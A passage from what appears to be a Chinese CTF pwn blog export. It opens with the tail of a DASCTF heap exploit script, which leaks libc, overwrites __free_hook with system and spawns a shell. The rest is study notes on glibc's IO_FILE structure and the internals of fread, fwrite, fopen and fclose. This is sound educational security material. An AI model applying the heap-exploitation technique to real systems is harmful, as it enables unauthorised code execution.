class="line">    payload+=p8(((heap+<span class="number">0x2d0</span>)&gt;&gt;<span class="number">8</span>*i&amp;<span class="number">0xff</span>))</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">reset()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">main_arena=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=main_arena-<span class="number">0x1ebf0a</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">reset()</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(free_hook)</span><br><span class="line">add(payload,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;/bin/sh\0&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">add(p64(system),<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">reset()</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h3><p>让我再想想</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>DASCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>FILE结构及利用</title>
    <url>/2022/07/27/FILE%E7%BB%93%E6%9E%84%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>把上半年学的东西总结一下。</p>
<span id="more"></span>

<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>IO_FILE 结构体在程序执行 fopen 等函数时会进行创建，并分配在堆中。</p>
<p>IO_FILE 结构体会通过 _chain 连接形成一个链表，链表头部用全局变量 _IO_list_all 表示，通常第一个指向 stderr ，通过这个变量我们可以遍历所有的 IO_FILE 结构体。</p>
<p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。可以在 libc.so 中找到这些符号，它们指向各自 IO_FILE 结构体的指针，而 IO_FILE 结构体真正的符号是 _IO_2_1_stderr_、_IO_2_1_stdout_、_IO_2_1_stdin_(即 stdout -&gt; _IO_2_1_stdout_)。</p>
<p>_IO_FILE 结构体一般处于 _IO_FILE_plus 中，_IO_FILE_plus 中还包含着 一个 IO_jump_t 类型指针 vtable。该结构类型中的成员是一些函数指针。</p>
<h3 id="结构体源码"><a href="#结构体源码" class="headerlink" title="结构体源码"></a>结构体源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="flags"><a href="#flags" class="headerlink" title="_flags"></a>_flags</h4><p>该标志的高两字节是由libc固定的，标志这个文件的类型，一般为<code>0xfbad</code>；低两字节决定程序的执行状态。</p>
<p>识别该标志是通过与运算，不同状态对应的二进制码如下(十六进制表示)：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure>

<p>其中各缓冲区指针的作用是在缓冲区中划分的一个范围：</p>
<ul>
<li>_IO_buf_base 指向文件流缓冲区的起始位置<br>_IO_buf_end 指向文件流缓冲区的结束位置</li>
<li>_IO_read_base 指向缓冲区中的待读出数据的起始位置<br>_IO_read_end 指向缓冲区中的待读出数据的结束位置<br>_IO_read_ptr 指向缓冲区中待读出数据的当前位置<ul>
<li>我们将 _IO_read_base 与 _IO_read_end 之间的缓冲区称为输入缓冲区</li>
</ul>
</li>
<li>_IO_write_base 指向缓冲区中待写入的起始位置<br>_IO_write_end 指向缓冲区中待写入的结束位置<br>_IO_write_ptr 指向缓冲区中待写入数据的当前位置<ul>
<li>我们将 _IO_write_base 与 _IO_write_end 之间的缓冲区称为输出缓冲区</li>
</ul>
</li>
</ul>
<p>vtable 相对于 _IO_FILE 的偏移是固定的，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8。(即相应 IO_FILE 结构体的长度)</p>
<p>_IO_FILE 结构体之间通过 chain 来链接，链表的头部是 IO_list_all，每个 chain 指向下一个文件流的 _flags(每个文件流的首地址)，IO_list_all 指向 stderr 的 _flags。</p>
<h4 id="vtable"><a href="#vtable" class="headerlink" title="vtable"></a>vtable</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中指向了各种函数，我们对文件流的 orw 都是调用的这个指针，这个指针再调用指针指向的函数。简单说下调用这些函数时的流程：</p>
<h5 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fread</span><span class="params">( <span class="keyword">void</span> *buffer, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> count, FILE *stream)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ul>
<li>buffer 存放读取数据的缓冲区。</li>
<li>size：指定每个记录的长度。</li>
<li>count： 指定记录的个数。</li>
<li>stream：目标文件流。</li>
</ul>
<p>返回值：返回读取到数据缓冲区中的记录个数</p>
<p>__read 指向的是 _IO_fread 函数，该函数位于 /glibc/libio/iofread.c。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t _IO_fread (<span class="keyword">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t bytes_requested = size * count;</span><br><span class="line">  _IO_size_t bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="keyword">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>_IO_fread 函数很短，实际上功能是由 _IO_sgetn 函数实现的， _IO_sgetn 位于 glibc/libio/genops.c。</p>
<p>_IO_sgetn 则直接调用 _IO_XSGETN，而 _IO_XSGETN 是一个宏定义，内容是调用 _IO_file_xsgetn，也就是 _IO_FILE_plus.vtable 中保存的 __xsgetn 指针。</p>
<p>_IO_file_xsgetn 函数位于 /glibc/libio/fileops.c。这个函数流程过长，我放到<a href="http://blog.rabb1t.xyz/2022/07/27/IO-FILE%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/#_IO_file_xsgetn">详情</a>中。</p>
<h5 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fwrite</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* buffer, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> count, FILE* stream)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ul>
<li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li>
<li>size: 要写入内容的单字节数;</li>
<li>count: 要进行写入 size 字节的数据项的个数;</li>
<li>stream: 目标文件指针;</li>
</ul>
<p>返回值：实际写入的数据项个数 count。</p>
<p>__write 指向 _IO_fwrite 的代码位于 /libio/iofwrite.c 中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t _IO_fwrite (<span class="keyword">const</span> <span class="keyword">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="keyword">const</span> <span class="keyword">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fwrite)</span><br></pre></td></tr></table></figure>

<p>在 _IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。_IO_sputn 也就是 __xsputn，其对应的默认函数是 _IO_new_file_xsputn 会调用同样位于 vtable 中的 _IO_OVERFLOW。而 _IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow。_IO_new_file_xsputn 与 _IO_new_file_overflow 都位于 /libio/fileops.c 中。<a href="http://blog.rabb1t.xyz/2022/07/27/IO-FILE%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/#_IO_file_xsputn">详情</a></p>
<h5 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">char</span> *filename, *type)</span></span>;</span><br></pre></td></tr></table></figure>

<p>位于 /libio/iofopen.c 中，很短，只是调用了 __fopen_internal。</p>
<h6 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE * _IO_new_fopen (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>__fopen_internal 主要是四个部分：<a href="http://blog.rabb1t.xyz/2022/07/27/IO-FILE%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/">详情</a></p>
<ul>
<li>malloc分配内存空间。</li>
<li>_IO_no_init 对file结构体进行null初始化。</li>
<li>_IO_file_init 将结构体链接进_IO_list_all链表。</li>
<li>_IO_file_fopen 执行系统调用打开文件。</li>
</ul>
<h6 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h6><ul>
<li>filename: 目标文件的路径</li>
<li>type: 打开方式的类型</li>
</ul>
<p>返回值: 返回一个文件指针</p>
<h5 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h5><p>位于 /libio/iofclose.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fclose</span><span class="params">(FILE *stream)</span></span>;</span><br></pre></td></tr></table></figure>

<h6 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h6><ul>
<li>stream: 文件流指针</li>
</ul>
<h6 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h6><ul>
<li>调用_IO_un_link将文件结构体从_IO_list_all链表中取下。</li>
<li>调用_IO_file_close_it关闭文件并释放缓冲区。</li>
<li>释放FILE内存以及确认文件关闭。</li>
</ul>
<p><a href="http://blog.rabb1t.xyz/2022/07/27/IO-FILE%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/">详情</a></p>
<p><strong>参考</strong></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/">CTF Wiki</a><br><a href="https://blog.csdn.net/qq_46441427/article/details/119769510">IO_FILE fread</a><br><a href="https://ray-cp.github.io/">raycp 大佬的 IO_FILE 系列</a></p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE部分相关函数详述</title>
    <url>/2022/07/27/IO-FILE%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>主要是 _IO_file_xsgetn、_IO_file_xsputn、__fopen_internal、_IO_new_fclose，有些混乱，之后再改进。</p>
<span id="more"></span>

<h2 id="IO-file-xsgetn"><a href="#IO-file-xsgetn" class="headerlink" title="_IO_file_xsgetn"></a>_IO_file_xsgetn</h2><p>_IO_file_xsgetn 函数的定义位于 /glibc/libio/fileops.c。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t _IO_file_xsgetn (_IO_FILE *fp, <span class="keyword">void</span> *data, _IO_size_t n)</span><br></pre></td></tr></table></figure>

<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
<li>fp: 文件流指针</li>
<li>data： 待读出数据指针</li>
<li>n： 待读出长度</li>
</ul>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol>
<li>定义变量，然后首先判断 _IO_buf_base &amp; _IO_save_base 是否为空。若 _IO_buf_base 为空，则说明缓冲区未建立，调用 _IO_doallocbuf。 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t want, have;</span><br><span class="line">    _IO_ssize_t count;</span><br><span class="line">    <span class="keyword">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">    want = n;</span><br><span class="line">    <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">        fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">    _IO_doallocbuf (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>接着进入循环，来进行缓冲区的拷贝：<br> 进行一些长度检测，然后从文件流中读入数据。读出后将 _IO_read_ptr+=n。 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// want = n;</span></span><br><span class="line"><span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">    <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">        fp-&gt;_IO_read_ptr += want;</span><br><span class="line">        want = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 未通过检测，则说明用户指定的长度有误，大于了缓冲区中的数据长度：<ul>
<li>若 have 存在，则以 have 为长度读出数据<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// char *s = data;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">            s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">            <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">            s += have;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            want -= have;</span><br><span class="line">            fp-&gt;_IO_read_ptr += have;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
检查是否有备份<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check for backup and repeat */</span></span><br><span class="line"><span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">&#123;</span><br><span class="line">    _IO_switch_to_main_get_area (fp);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>这里是检测是否 _IO_buf_base 是否存在且大于 want，并调用 __underflow，来判断缓冲区中是否有内容。 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">    the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">    the user buffer. */</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 __underflow 位于 /glibc/libio/genops.c。而当前会使用到的仅有其中对缓冲区内容的判断，实际上 __underflow 的功能肯定不止于此，待会再细说。 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    ……</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__underflow)</span><br></pre></td></tr></table></figure></li>
<li>接着设置 _IO_buf_base <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// #define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb), (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br><span class="line"><span class="comment">// #define _IO_setp(__fp, __p, __ep) ((__fp)-&gt;_IO_write_base = (__fp)-&gt;_IO_write_ptr = __p, (__fp)-&gt;_IO_write_end = (__ep))</span></span><br><span class="line">        <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">            waiting for input. */</span></span><br><span class="line">        _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">        _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure></li>
<li>最后对 _flags 做一些设置。 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">        count = want;</span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">        &#123;</span><br><span class="line">            _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">            <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">                count -= want % block_size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">        <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">                fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s += count;</span><br><span class="line">        want -= count;</span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">            _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> n - want;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="IO-doallocbuf"><a href="#IO-doallocbuf" class="headerlink" title="_IO_doallocbuf"></a>_IO_doallocbuf</h3><p>_IO_doallocbuf 的作用是初始化缓冲区。</p>
